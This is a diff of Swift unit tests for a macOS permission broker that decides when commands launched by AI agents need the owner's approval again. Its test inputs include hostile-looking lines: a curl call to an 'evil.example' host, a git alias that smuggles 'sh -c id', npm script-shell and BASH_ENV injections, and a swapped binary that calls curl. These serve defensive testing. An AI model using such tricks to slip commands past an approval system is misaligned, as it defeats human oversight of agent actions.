@@ -309,6 +309,47 @@ final class StandingPermissionsTests: XCTestCase {
         XCTAssertTrue(empty.isEmpty)
     }
 
+    /// With no agent in the chain (a command in Terminal, or one an agent started outside its own tree), only "this
+    /// agent session" is offered: a longer one would cover whatever else ends up with no agent.
+    func testWithNoAgentOnlyASessionGrant() async {
+        var lone = caller
+        lone.agent = nil
+        _ = await grant(run(["Scripts/a.sh"]), from: lone, length: .days30)
+        XCTAssertEqual(approver.prompts.last?.lasting, .sessionOnly)
+        XCTAssertEqual(store.inForce, [], "30 days was refused")
+        _ = await grant(run(["Scripts/a.sh"]), from: lone, length: .session)
+        XCTAssertEqual(store.inForce.first?.length, .session)
+        XCTAssertEqual(store.inForce.first?.agent, "none")
+    }
+
+    /// The grant records what the window showed: a script edited while the window was open makes none.
+    func testAScriptEditedWhileTheWindowIsOpenMakesNoGrant() async throws {
+        approver.onPresent = { [unowned self] _ in try? self.script("Scripts/a.sh", "echo changed while asking") }
+        approver.script = [.allowLasting([0], .days7)]
+        let answer = await broker().handle(run(["Scripts/a.sh"]), from: caller)
+        XCTAssertNil(answer.errorCode, "this use goes ahead: the owner approved it")
+        XCTAssertEqual(store.inForce, [])
+        XCTAssertEqual(activity.records.last?.outcome, .allowedOnce)
+    }
+
+    /// Turned off while locked: the session grants are gone from the file at the next unlock.
+    func testSessionGrantsEndedWhileLockedAreRemovedAtUnlock() async {
+        _ = await grant(run(["Scripts/a.sh"]), length: .session)
+        database.locked = true
+        now = now.addingTimeInterval(1)
+        store.endSessions()
+        database.locked = false
+        XCTAssertEqual(store.inForce, [], "already ended in memory")
+        XCTAssertEqual(database.read()?.all.count, 1)
+        store.unlocked()
+        XCTAssertEqual(database.read()?.all.count, 0)
+    }
+
+    /// An answer let through by a grant fits a frame as well: the size check counts the grant's longer `by`.
+    func testTheSizeCheckCountsALongBy() {
+        XCTAssertGreaterThanOrEqual(VaultBroker.longestBy.count, "this agent session, this project".count)
+    }
+
     func testTheMacIdentifierIsAHash() {
         let one = AgentMacIdentity.identifier(hardwareUUID: "11111111-2222-3333-4444-555555555555")
         XCTAssertEqual(one.count, 32)
@@ -332,7 +373,7 @@ final class AgentProgramRuleTests: XCTestCase {
         // Stand-ins for tools a test Mac may not have, outside the project.
         bin = project.deletingLastPathComponent().appendingPathComponent("bin-\(UUID().uuidString)", isDirectory: true)
         try FileManager.default.createDirectory(at: bin, withIntermediateDirectories: true)
-        for name in ["node", "npm", "npx", "uv"] {
+        for name in ["node", "npm", "npx", "uv", "tsx", "git"] {
             FileManager.default.createFile(atPath: bin.appendingPathComponent(name).path, contents: Data("#!/bin/sh\n".utf8), attributes: [.posixPermissions: 0o755])
         }
     }
@@ -374,11 +415,38 @@ final class AgentProgramRuleTests: XCTestCase {
         XCTAssertNotEqual(a.key, binding(["Scripts/a.sh"])?.key)
     }
 
-    func testAProgramOutsideTheProjectIsBoundByPath() throws {
+    /// A program outside the project is bound with its arguments: it covers that command and nothing else.
+    func testAProgramOutsideTheProjectIsBoundWithItsArguments() throws {
         let curl = try XCTUnwrap(binding(["curl", "-d", "@-"]))
         XCTAssertEqual(curl.program, "/usr/bin/curl")
-        XCTAssertTrue(curl.contents.isEmpty)
-        XCTAssertNotEqual(curl.key, binding(["git"])?.key)
+        XCTAssertTrue(curl.contents.isEmpty, "a system program is not bound by its identity on disk")
+        XCTAssertEqual(curl.display, "/usr/bin/curl -d @-")
+        XCTAssertEqual(curl.key, binding(["curl", "-d", "@-"])?.key)
+        XCTAssertNotEqual(curl.key, binding(["curl", "-d", "@-", "https://evil.example"])?.key)
+        // A program this file does not know runs exactly what was granted: `git -c alias.x=!sh …` is another command.
+        let git = try XCTUnwrap(binding(["git", "push"], program: tool("git")))
+        XCTAssertNotEqual(git.key, binding(["git", "-c", "alias.x=!sh -c id", "x"], program: tool("git"))?.key)
+    }
+
+    /// A program outside the protected system folders is bound by its identity on disk: replacing it asks again.
+    func testAReplacedProgramAsks() throws {
+        let before = try XCTUnwrap(binding(["git", "push"], program: tool("git")))
+        XCTAssertEqual(before.contents.count, 1)
+        try FileManager.default.removeItem(atPath: tool("git"))
+        FileManager.default.createFile(atPath: tool("git"), contents: Data("#!/bin/sh\ncurl evil\n".utf8), attributes: [.posixPermissions: 0o755])
+        XCTAssertNotEqual(before.key, binding(["git", "push"], program: tool("git"))?.key)
+    }
+
+    /// A link to a shared interpreter (a virtual environment's python) is bound as typed, not only as resolved.
+    func testWhichLinkWasRunIsBound() throws {
+        let venv = project.appendingPathComponent("venv-a/bin")
+        let other = project.appendingPathComponent("venv-b/bin")
+        for folder in [venv, other] {
+            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+            try FileManager.default.createSymbolicLink(atPath: folder.appendingPathComponent("python3").path, withDestinationPath: tool("node"))
+        }
+        let a = try XCTUnwrap(binding(["venv-a/bin/python3", "upload.js"], program: venv.appendingPathComponent("python3").path))
+        XCTAssertNotEqual(a.key, binding(["venv-b/bin/python3", "upload.js"], program: other.appendingPathComponent("python3").path)?.key)
     }
 
     func testShellsAreBoundToTheirScript() throws {
@@ -407,6 +475,77 @@ final class AgentProgramRuleTests: XCTestCase {
         asks(["node", "--eval", "1"], program: tool("node"))
         asks(["npx", "-c", "echo"], program: tool("npx"))
         asks(["env", "sh", "-c", "echo"])
+        asks(["tsx", "-e", "fetch(x)"], program: tool("tsx"))
+        asks(["python3-intel64", "-c", "1"], program: "/usr/bin/python3")
+    }
+
+    /// A login shell runs profile files that are not bound.
+    func testLoginShellsAsk() {
+        asks(["bash", "-l", "Scripts/a.sh"], program: "/bin/bash")
+        asks(["zsh", "--login", "Scripts/a.sh"], program: "/bin/zsh")
+        asks(["sh", "-el", "Scripts/a.sh"], program: "/bin/sh")
+    }
+
+    /// What a launcher would find later on a PATH this file does not see asks.
+    func testBareNamesAfterALauncherAsk() {
+        asks(["env", "deploy"])
+        asks(["env", "FOO=1", "python3", "tool.py"])
+        asks(["uv", "run", "pytest"], program: tool("uv"))
+        XCTAssertEqual(binding(["env", "FOO=1", "./tool.py"])?.display, "env tool.py")
+    }
+
+    func testPackageManagerSettingsAndFlagsAreBound() throws {
+        let deploy = try XCTUnwrap(binding(["npm", "run", "deploy"], program: tool("npm")))
+        XCTAssertNotEqual(deploy.key, binding(["npm", "run", "deploy", "--script-shell=/tmp/evil.sh"], program: tool("npm"))?.key)
+        try "script-shell=./x.sh\n".write(to: project.appendingPathComponent(".npmrc"), atomically: true, encoding: .utf8)
+        XCTAssertNotEqual(deploy.key, binding(["npm", "run", "deploy"], program: tool("npm"))?.key, "a new .npmrc asks again")
+        asks(["Scripts/a.sh"], environment: ["npm_config_script_shell"])
+        asks(["Scripts/a.sh"], environment: ["NPM_CONFIG_Script_Shell"])
+        asks(["Scripts/a.sh"], environment: ["YARN_YARN_PATH"])
+        asks(["Scripts/a.sh"], environment: ["BASH_FUNC_curl%%"])
+    }
+
+    func testEveryMakefileIsBound() throws {
+        try "evil:\n".write(to: project.appendingPathComponent("evil.mk"), atomically: true, encoding: .utf8)
+        let plain = try XCTUnwrap(binding(["make", "release"]))
+        XCTAssertNotEqual(plain.key, binding(["make", "-f", "evil.mk", "-f", "Makefile", "release"])?.key)
+        XCTAssertEqual(binding(["make", "-f", "evil.mk", "-f", "Makefile", "release"])?.contents.count, 2)
+    }
+
+    func testXcrunToolchainsAndSDKPathsAsk() {
+        asks(["xcrun", "--toolchain", "evil", "notarytool"])
+        asks(["xcrun", "--sdk", "/tmp/evil.sdk", "notarytool"])
+        asks(["xcrun", "notarytool"], environment: ["TOOLCHAINS"])
+        asks(["xcrun", "notarytool"], environment: ["SDKROOT"])
+        XCTAssertNotNil(binding(["xcrun", "--sdk", "macosx", "notarytool"]))
+    }
+
+    /// Names the tool itself adds to the command's environment (an `.env.pp`'s plain lines) count as much as inherited
+    /// ones; an environment that could not be read asks.
+    func testAddedAndUnreadableEnvironmentsAsk() {
+        let script = project.appendingPathComponent("Scripts/a.sh").path
+        func verdict(environment: [String]?, added: [String]?) -> AgentProgramVerdict {
+            AgentProgramRule.bind(program: script, argv: ["Scripts/a.sh"], cwd: project.path, project: project.path, environment: environment, added: added)
+        }
+        XCTAssertEqual(verdict(environment: [], added: ["BASH_ENV"]), .asksEveryTime("Started with BASH_ENV set, which makes programs load other code."))
+        XCTAssertEqual(verdict(environment: [], added: ["PATH"]), .asksEveryTime("The command's PATH is set by its .env.pp."))
+        XCTAssertEqual(verdict(environment: nil, added: []), .asksEveryTime("The command's environment could not be read."))
+        XCTAssertEqual(verdict(environment: [], added: nil), .asksEveryTime("The command's environment could not be read."))
+        if case .asksEveryTime = verdict(environment: ["PATH", "HOME"], added: ["SIGNING_TEAM"]) { XCTFail("plain variables bind") }
+    }
+
+    /// The kernel's environment block is read to its end: an empty entry hides nothing after it.
+    func testAnEmptyEnvironmentEntryHidesNothing() {
+        var bytes: [UInt8] = []
+        withUnsafeBytes(of: Int32(1)) { bytes += $0 }
+        for part in ["/bin/tool", "", "", "tool", "A=1", "", "BASH_ENV=/tmp/x", "ptr_munge="] { bytes += Array(part.utf8) + [0] }
+        XCTAssertEqual(LiveProcessFacts.environmentNames(procargs: bytes, size: bytes.count), ["A", "BASH_ENV", "ptr_munge"])
+    }
+
+    /// This test process's own environment, read from the kernel as the app reads the tool's.
+    func testTheLiveEnvironmentIsRead() throws {
+        let names = try XCTUnwrap(LiveProcessFacts.shared.environmentNames(getpid()))
+        XCTAssertTrue(names.contains("PATH"))
     }
 
     func testUnknownLaunchersAndUnreadOptionsAsk() {
@@ -451,16 +590,18 @@ final class AgentProgramRuleTests: XCTestCase {
         XCTAssertEqual(python.display, "python3 tool.py")
         XCTAssertEqual(python.contents.count, 1)
         XCTAssertEqual(binding(["python3", "-u", "tool.py"])?.key, python.key)
-        XCTAssertEqual(binding(["python3", "-m", "twine", "upload"])?.display, "python3 -m twine")
-        XCTAssertEqual(binding(["python3", "-m", "tool"])?.contents.count, 1, "a local module is bound by its content")
+        asks(["python3", "-m", "twine", "upload"])
+        XCTAssertEqual(binding(["python3", "-m", "tool"])?.display, "python3 -m tool", "a local module is bound by its content")
         XCTAssertEqual(binding(["node", "upload.js"], program: tool("node"))?.display, "node upload.js")
         let notarytool = try XCTUnwrap(binding(["xcrun", "notarytool", "submit", "x.dmg"]))
         XCTAssertEqual(notarytool.display, "xcrun notarytool")
         XCTAssertNotEqual(notarytool.key, binding(["xcrun", "altool"])?.key)
-        XCTAssertEqual(binding(["xcrun", "--sdk", "macosx", "notarytool"])?.key, notarytool.key)
+        XCTAssertEqual(binding(["xcrun", "notarytool", "submit", "y.dmg"])?.key, notarytool.key, "Apple's release tools take another file each time")
+        XCTAssertNotEqual(binding(["xcrun", "--sdk", "macosx", "notarytool"])?.key, notarytool.key, "the SDK is bound")
         let deploy = try XCTUnwrap(binding(["npm", "run", "deploy"], program: tool("npm")))
         XCTAssertEqual(deploy.display, "npm run deploy")
-        XCTAssertEqual(deploy.contents.count, 1, "bound to package.json")
+        XCTAssertTrue(deploy.contents.keys.contains { $0.hasSuffix("/package.json") }, "bound to package.json")
+        XCTAssertEqual(deploy.contents.filter { $0.key.hasSuffix("/.npmrc") }.values.first, "absent")
         XCTAssertNotEqual(deploy.key, binding(["npm", "run", "test"], program: tool("npm"))?.key)
         asks(["npm", "exec", "x"], program: tool("npm"))
         let make = try XCTUnwrap(binding(["make", "release"]))
@@ -468,8 +609,8 @@ final class AgentProgramRuleTests: XCTestCase {
         XCTAssertNotEqual(make.key, binding(["make", "clean"])?.key)
         try "changed\n".write(to: project.appendingPathComponent("Makefile"), atomically: true, encoding: .utf8)
         XCTAssertNotEqual(make.key, binding(["make", "release"])?.key)
-        XCTAssertEqual(binding(["npx", "-y", "wrangler", "deploy"], program: tool("npx"))?.display, "npx wrangler")
-        XCTAssertEqual(binding(["env", "FOO=1", "python3", "tool.py"])?.display, "env python3 tool.py")
+        XCTAssertEqual(binding(["npx", "-y", "wrangler", "deploy"], program: tool("npx"))?.display, "npx wrangler deploy")
+        XCTAssertNotEqual(binding(["npx", "wrangler", "deploy"], program: tool("npx"))?.key, binding(["npx", "wrangler", "tail"], program: tool("npx"))?.key)
         XCTAssertEqual(binding(["uv", "run", "tool.py"], program: tool("uv"))?.display, "uv run tool.py")
     }
 
@@ -477,7 +618,9 @@ final class AgentProgramRuleTests: XCTestCase {
         XCTAssertEqual(AgentProgramRule.family("python3.12"), "python")
         XCTAssertEqual(AgentProgramRule.family("Python3"), "python")
         XCTAssertEqual(AgentProgramRule.family("-zsh"), "zsh")
-        XCTAssertEqual(AgentProgramRule.family("pythonista"), "pythonista")
+        XCTAssertEqual(AgentProgramRule.family("python3-intel64"), "python")
+        XCTAssertEqual(AgentProgramRule.family("tsx"), "node")
+        XCTAssertEqual(AgentProgramRule.family("git"), "git")
         XCTAssertEqual(AgentProgramRule.family("node22"), "node")
     }
 }
